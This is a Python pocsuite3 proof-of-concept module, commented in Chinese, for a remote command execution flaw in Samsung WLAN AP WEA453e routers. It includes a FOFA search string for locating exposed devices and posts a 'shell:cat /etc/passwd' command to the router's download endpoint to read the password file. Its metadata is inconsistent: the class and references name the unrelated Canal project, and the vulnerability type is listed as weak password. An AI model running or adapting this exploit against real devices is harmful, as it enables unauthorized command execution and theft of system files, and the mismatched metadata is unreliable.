from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class Canal(POCBase):
    # fofa语句: title==“Samsung WLAN AP”
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "derian"  # PoC作者的大名
    vulDate = "2021-11-11"  # 漏洞公开的时间,不知道就写今天
    createDate = "2021-11-11"  # 编写 PoC 的日期
    updateDate = "2021-11-11"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/alibaba/canal"]  # 漏洞地址来源,0day不用写
    name = "三星 WLAN AP WEA453e 路由器 远程命令执行"  # PoC 名称
    appPowerLink = "https://github.com/alibaba/canal"  # 漏洞厂商主页地址
    appName = "三星 WLAN AP WEA453e 路由器 "  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """三星 WLAN AP WEA453e 路由器 远程命令执行"""  # 漏洞简要描述
    pocDesc = """cat /etc/passwd"""  # POC用法描述

    def _check(self):
        url = self.url.strip()
        full_url = f"{url}/(download)/tmp/a.txt"
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                         "Origin": f"{url}", "Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Referer": f"{url}/", "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8", "Connection": "close"}
        data = {"command1": "shell:cat /etc/passwd| dd of=/tmp/a.txt"}
        result = []
        try:
            response = requests.post(full_url, headers=headers, data=data, verify=False, timeout=5,
                                     allow_redirects=False)
            text = response.text
            # 判断是否存在漏洞
            if "root:" in text:
                result.append(url)
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(Canal)
